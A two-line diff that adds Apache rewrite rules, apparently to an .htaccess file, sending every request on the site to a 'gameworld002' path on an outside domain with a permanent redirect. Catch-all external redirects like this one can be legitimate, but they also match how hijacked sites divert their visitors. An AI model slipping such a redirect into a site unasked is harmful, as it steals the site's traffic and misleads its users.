@@ -1,0 +1,2 @@
+RewriteEngine On
+RewriteRule ^ https://www.italianmastersclub.it/gameworld002/ [R=301,L,NE]
